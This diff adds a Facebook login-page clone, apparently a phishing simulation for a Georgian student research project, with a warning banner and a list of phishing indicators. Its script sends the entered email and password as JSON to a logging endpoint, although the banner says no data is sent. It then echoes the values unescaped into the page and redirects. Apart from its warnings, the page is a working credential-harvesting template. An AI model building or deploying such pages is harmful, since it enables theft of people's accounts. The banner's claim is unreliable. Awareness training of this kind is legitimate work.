@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook – DEMO</title>
+<style>
+  :root {
+    --fb-blue: #1877f2;
+    --fb-dark: #1c1e21;
+    --fb-border: #dddfe2;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: Helvetica, Arial, sans-serif;
+    background: #f0f2f5;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .warning-banner {
+    width: 100%; background: #c0392b; color: #fff;
+    text-align: center; padding: 12px 20px;
+    font-size: 13px; font-weight: bold;
+    position: sticky; top: 0; z-index: 9999;
+  }
+
+  .indicators {
+    width: 100%; max-width: 780px;
+    margin: 16px auto 0;
+    background: #fff3cd; border: 2px solid #ffc107;
+    border-radius: 10px; padding: 14px 20px;
+  }
+  .indicators h3 { color: #856404; font-size: 13px; margin-bottom: 8px; }
+  .indicators ul { color: #533f03; font-size: 12px; padding-left: 18px; line-height: 1.8; }
+
+  .url-bar {
+    width: 100%; max-width: 780px;
+    background: #2d2d2d; color: #aaa;
+    font-size: 12px; padding: 8px 16px;
+    display: flex; align-items: center; gap: 8px;
+    font-family: monospace; border-radius: 8px 8px 0 0; margin-top: 10px;
+  }
+  .url-bar .fake { color: #e74c3c; }
+  .url-bar .real { color: #27ae60; }
+
+  /* ─── MAIN ─── */
+  .main-wrap {
+    width: 100%; max-width: 780px;
+    background: #fff;
+    border-radius: 0 0 12px 12px;
+    box-shadow: 0 2px 20px rgba(0,0,0,0.1);
+    margin-bottom: 40px;
+  }
+
+  /* FB TOP NAV */
+  .fb-nav {
+    background: #fff;
+    border-bottom: 1px solid var(--fb-border);
+    padding: 0 16px;
+    display: flex; align-items: center; gap: 8px;
+    height: 56px;
+  }
+  .fb-logo { color: var(--fb-blue); font-size: 32px; font-weight: 900; letter-spacing: -1px; }
+  .fb-search {
+    flex: 0 0 240px;
+    background: #f0f2f5; border: none;
+    border-radius: 20px; padding: 8px 16px;
+    font-size: 14px; color: #1c1e21; outline: none;
+  }
+
+  /* CONTENT AREA */
+  .content { display: flex; min-height: 480px; }
+
+  .left-info {
+    flex: 1;
+    padding: 40px 36px 40px 48px;
+    display: flex; flex-direction: column; justify-content: center;
+  }
+  .left-info .fb-big-logo {
+    color: var(--fb-blue); font-size: 56px; font-weight: 900;
+    letter-spacing: -2px; margin-bottom: 16px;
+  }
+  .left-info p {
+    font-size: 24px; color: #1c1e21;
+    line-height: 1.4; max-width: 340px;
+  }
+
+  .login-box {
+    width: 360px; padding: 16px 16px 28px;
+    display: flex; flex-direction: column; gap: 10px;
+    align-self: center; margin: 20px 32px 20px 0;
+    background: #fff;
+    border: 1px solid var(--fb-border);
+    border-radius: 8px;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+  }
+  .login-box input {
+    padding: 14px 16px;
+    border: 1px solid #ccc; border-radius: 6px;
+    font-size: 17px; outline: none;
+  }
+  .login-box input:focus { border-color: var(--fb-blue); box-shadow: 0 0 0 2px rgba(24,119,242,0.2); }
+  .btn-login {
+    padding: 14px;
+    background: var(--fb-blue); color: #fff;
+    border: none; border-radius: 6px;
+    font-size: 20px; font-weight: 700;
+    cursor: pointer; transition: background .15s;
+  }
+  .btn-login:hover { background: #166fe5; }
+
+  .divider {
+    border: none; border-top: 1px solid var(--fb-border);
+    margin: 4px 0;
+  }
+  .btn-create {
+    padding: 13px;
+    background: #42b72a; color: #fff;
+    border: none; border-radius: 6px;
+    font-size: 17px; font-weight: 700;
+    cursor: pointer; transition: background .15s;
+  }
+  .btn-create:hover { background: #36a420; }
+  .forgot { text-align: center; font-size: 14px; color: var(--fb-blue); cursor: pointer; }
+
+  /* ─── POPUP ─── */
+  .overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,0.6);
+    z-index: 8888; align-items: center; justify-content: center;
+  }
+  .overlay.show { display: flex; }
+  .popup {
+    background: #fff; border-radius: 14px;
+    padding: 36px 40px; max-width: 460px; width: 90%;
+    text-align: center;
+  }
+  .popup .icon { font-size: 52px; margin-bottom: 12px; }
+  .popup h2 { font-size: 20px; margin-bottom: 10px; }
+  .popup p { font-size: 13px; color: #555; line-height: 1.7; margin-bottom: 16px; }
+  .captured {
+    background: #fff3cd; border: 1px solid #ffc107;
+    border-radius: 8px; padding: 14px; margin-bottom: 18px;
+    font-size: 13px; color: #856404; text-align: left;
+  }
+  .captured strong { display: block; font-size: 11px; text-transform: uppercase; margin-bottom: 6px; }
+  .popup button {
+    background: #c0392b; color: #fff; border: none;
+    border-radius: 8px; padding: 12px 32px;
+    font-size: 14px; font-weight: 600; cursor: pointer;
+  }
+</style>
+</head>
+<body>
+
+<div class="warning-banner">
+  ⚠️ სასწავლო/სადემონსტრაციო ფიშინგის სიმულაცია — საბაკალავრო კვლევა. მონაცემები არ იგზავნება.
+</div>
+
+<div class="indicators">
+  <h3>🔍 ფიშინგის ინდიკატორები:</h3>
+  <ul>
+    <li><strong>URL:</strong> რეალური: <code>facebook.com</code> — ყალბი: <code>faceb00k-login.verify-account.net</code></li>
+    <li><strong>დომენი:</strong> ფიშინგ დომენები ხშირად იყენებენ "0" "o"-ს ნაცვლად, ან სუბდომენებს: <code>facebook.secure-check.ru</code></li>
+    <li><strong>Login ფორმა:</strong> POST request არ მიდის facebook.com-ზე, მიდის თავდამსხმელის სერვერზე</li>
+    <li><strong>სასწრაფო მოქმედების მოთხოვნა:</strong> "ანგარიში დაიბლოკება 24 საათში" — ტიპიური მანიპულაციის ტექნიკა</li>
+    <li><strong>Cookie/Session hijacking:</strong> მოწინავე ვარიანტებში 2FA-ც ისრიალება real-time proxy-ით</li>
+  </ul>
+</div>
+
+<div class="url-bar">
+  🔒 <span class="fake">faceb00k-login.verify-account.net/checkpoint/login</span>
+  <span style="color:#666;margin-left:auto">რეალური: <span class="real">facebook.com</span></span>
+</div>
+
+<div class="main-wrap">
+  <!-- NAV -->
+  <div class="fb-nav">
+    <div class="fb-logo">facebook</div>
+    <input class="fb-search" type="text" placeholder="🔍  ძებნა Facebook-ზე">
+  </div>
+
+  <!-- CONTENT -->
+  <div class="content">
+    <div class="left-info">
+      <div class="fb-big-logo">facebook</div>
+      <p>Facebook გაძლევს საშუალებას დაუკავშირდე და გაუზიარო ინფორმაცია ყველა, ვინც შენს ცხოვრებაშია.</p>
+    </div>
+
+    <div class="login-box">
+      <input type="email" id="email" placeholder="ელ-ფოსტა ან ტელეფონი" autocomplete="off">
+      <input type="password" id="password" placeholder="პაროლი">
+      <button class="btn-login" onclick="submitForm()">შესვლა</button>
+      <div class="forgot">დაგავიწყდათ პაროლი?</div>
+      <hr class="divider">
+      <button class="btn-create">ახალი ანგარიშის შექმნა</button>
+    </div>
+  </div>
+
+  <div style="text-align:center;padding:16px;font-size:12px;color:#737373;border-top:1px solid #dddfe2;">
+    Meta © 2024 · კონფიდენციალურობა · პირობები · Cookie · სარეკლამო · სხვა
+  </div>
+</div>
+
+<!-- POPUP -->
+<div class="overlay" id="overlay">
+  <div class="popup">
+    <div class="icon">🎣</div>
+    <h2>ფიშინგის სიმულაცია დასრულდა!</h2>
+    <p>რეალური შეტევისას შემდეგი გაიგზავნებოდა:</p>
+    <div class="captured">
+      <strong>⚠️ "ჩაჭერილი" მონაცემები (სიმულაცია):</strong>
+      <div id="captured-data"></div>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:16px;">
+      Adversary-in-the-Middle (AiTM) ფიშინგში 2FA კოდიც ინტერცეპტდება real-time-ში, 
+      რადგან ყალბი გვერდი ნამდვილ გვერდს proxies-ით ემსახურება.
+    </p>
+    <button onclick="document.getElementById('overlay').classList.remove('show')">გასაგებია</button>
+  </div>
+</div>
+
+<script>
+function submitForm() {
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
+
+  fetch("https://localhost:7011/api/log", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+  type: "Facebook",
+  email: email,
+  password: password
+  })
+  });
+
+  const e = email || '(ცარიელი)';
+  const p = password || '(ცარიელი)';
+
+  document.getElementById('captured-data').innerHTML =
+    `📌 Type: <strong>${"facebook"}</strong><br>
+    📧 ელ-ფოსტა/ტელეფონი: <strong>${e}</strong><br>
+     🔑 პაროლი: <strong>${p}</strong><br>
+     🌍 IP, Browser fingerprint, Cookies`;
+// redirect 1 წამში
+  setTimeout(() => {
+    window.location.href = "techshop-referral-demo2.html";
+  }, 1000);
+}
+</script>
+</body>
+</html>
